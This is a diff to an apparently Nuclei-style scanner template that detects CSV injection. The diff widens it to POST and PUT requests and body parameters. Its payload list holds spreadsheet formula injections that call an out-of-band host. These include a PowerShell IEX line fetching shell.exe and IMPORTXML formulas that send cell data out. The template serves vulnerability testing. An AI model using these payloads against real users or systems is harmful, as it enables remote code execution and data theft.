@@ -6,14 +6,15 @@ info:
   severity: medium
   description: |
     A CSV injection detection template to identify and prevent CSV injection vulnerabilities by using various payloads that could be interpreted as formulas by spreadsheet applications.
-  tags: dast,csv,oast
+  tags: dast,csv,oast,vuln
 
 http:
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
+          - 'method == "POST"'
+          - 'method == "PUT"'
     payloads:
       csv_fuzz:
         - "class.module.classLoader.resources.context.configFile=http://{{interactsh-url}}"
@@ -22,14 +23,15 @@ http:
         - "=10+20+cmd|' /C nslookup{{interactsh-url}}'!A0"
         - "=cmd|' /C nslookup{{interactsh-url}}'!'A1'"
         - "=cmd|'/C powershell IEX(wget{{interactsh-url}}/shell.exe)'!A0"
-        - "=cmd|'/c rundll32.exe \\{{interactsh-url}}\3\2\1.dll,0'!_xlbgnm.A1"
         - '=IMPORTXML(CONCAT("http://{{interactsh-url}}", CONCATENATE(A2:E2)), "//a/a10")'
         - '=IMPORTFEED(CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)))'
         - '=IMPORTHTML (CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)),"table",1)'
-        - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'     
+        - '=IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")'
 
     fuzzing:
-      - part: query
+      - parts:
+          - query
+          - body
         type: replace # replaces existing parameter value with fuzz payload
         mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
@@ -48,3 +50,4 @@ http:
           - "text/csv"
           - "application/csv"
           - "application/vnd.ms-excel"
+# digest: 4a0a00473045022047de9a9ade28a139a37de842b237ae72a42ccfed58a24a2166c1191da3ca847d022100a321d8f99e99bba547fcc6cdb6db36a15392eeceaf24cb7f7a4f72478899ded5:922c64590222798bb761d5b6d8e72950
